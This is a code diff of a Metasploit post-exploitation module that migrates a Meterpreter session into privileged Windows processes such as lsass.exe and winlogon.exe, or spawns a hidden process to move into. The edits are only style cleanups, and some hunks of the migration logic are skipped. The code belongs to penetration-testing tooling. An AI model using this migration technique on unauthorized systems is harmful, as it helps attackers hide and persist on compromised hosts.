@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,39 +8,38 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Priv
 
-  DEFAULT_ADMIN_TARGETS = [ 'services.exe', 'winlogon.exe', 'wininit.exe', 'lsm.exe', 'lsass.exe' ]
-  DEFAULT_USER_TARGETS  = [ 'explorer.exe', 'notepad.exe' ]
+  DEFAULT_ADMIN_TARGETS = [ 'services.exe', 'winlogon.exe', 'wininit.exe', 'lsm.exe', 'lsass.exe' ].freeze
+  DEFAULT_USER_TARGETS  = [ 'explorer.exe', 'notepad.exe' ].freeze
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Privilege Based Process Migration ',
-      'Description'   => %q{ This module will migrate a Meterpreter session based on session privileges.
-         It will do everything it can to migrate, including spawing a new User level process.
-         For sessions with Admin rights: It will try to migrate into a System level process in the following
-         order: ANAME (if specified), services.exe, winlogon.exe, wininit.exe, lsm.exe, and lsass.exe.
-         If all these fail, it will fall back to User level migration. For sessions with User level rights:
-         It will try to migrate to a user level process, if that fails it will attempt to spawn the process
-         then migrate to it. It will attempt the User level processes in the following order:
-         NAME (if specified), explorer.exe, then notepad.exe.},
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'Josh Hale <jhale85446[at]gmail.com>',
-          'theLightCosine'
-        ],
-      'Platform'      => ['win' ],
-      'SessionTypes'  => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Manage Privilege Based Process Migration ',
+                      'Description'   => %q{ This module will migrate a Meterpreter session based on session privileges.
+                         It will do everything it can to migrate, including spawing a new User level process.
+                         For sessions with Admin rights: It will try to migrate into a System level process in the following
+                         order: ANAME (if specified), services.exe, winlogon.exe, wininit.exe, lsm.exe, and lsass.exe.
+                         If all these fail, it will fall back to User level migration. For sessions with User level rights:
+                         It will try to migrate to a user level process, if that fails it will attempt to spawn the process
+                         then migrate to it. It will attempt the User level processes in the following order:
+                         NAME (if specified), explorer.exe, then notepad.exe.},
+                      'License'       => MSF_LICENSE,
+                      'Author'        =>
+                        [
+                          'Josh Hale <jhale85446[at]gmail.com>',
+                          'theLightCosine'
+                        ],
+                      'Platform'      => ['win' ],
+                      'SessionTypes'  => ['meterpreter' ]))
 
     register_options(
       [
         OptString.new('ANAME', [false, 'System process to migrate to. For sessions with Admin rights. (See Module Description.)']),
         OptString.new('NAME',  [false, 'Process to migrate to. For sessions with User rights. (See Module Description.)']),
-        OptBool.new(  'KILL',  [false, 'Kill original session process.', false])
-      ], self.class)
+        OptBool.new('KILL',  [false, 'Kill original session process.', false])
+      ], self.class
+    )
   end
 
   def run
@@ -47,9 +47,7 @@ class MetasploitModule < Msf::Post
     @original_pid  = client.sys.process.open.pid
     @original_name = client.sys.process.open.name
     print_status("Current session process is #{@original_name} (#{@original_pid}) as: #{client.sys.config.getuid}")
-    unless migrate_admin
-      migrate_user
-    end
+    migrate_user unless migrate_admin
   end
 
   # This function returns the first process id of a process with the name provided.
@@ -61,11 +59,9 @@ class MetasploitModule < Msf::Post
   def get_pid(proc_name)
     processes = client.sys.process.get_processes
     processes.each do |proc|
-      if proc['name'] == proc_name && proc['user'] != ""
-        return proc['pid']
-      end
+      return proc['pid'] if proc['name'] == proc_name && proc['user'] != ""
     end
-    return nil
+    nil
   end
 
   # This function will try to kill the original session process
@@ -89,7 +85,7 @@ class MetasploitModule < Msf::Post
   # @return [TrueClass] if it successfully migrated
   # @return [FalseClass] if it failed to migrate
   def migrate(target_pid, proc_name, current_pid)
-    if !target_pid
+    unless target_pid
       print_error("Could not migrate to #{proc_name}.")
       return false
     end
@@ -175,7 +171,7 @@ class MetasploitModule < Msf::Post
   def spawn(proc_name)
     begin
       print_status("Attempting to spawn #{proc_name}")
-      proc = session.sys.process.execute(proc_name, nil, {'Hidden' => true })
+      proc = session.sys.process.execute(proc_name, nil, 'Hidden' => true)
       print_good("Successfully spawned #{proc_name}")
       return proc.pid
     rescue ::Rex::Post::Meterpreter::RequestError => error
@@ -185,4 +181,3 @@ class MetasploitModule < Msf::Post
     end
   end
 end
-
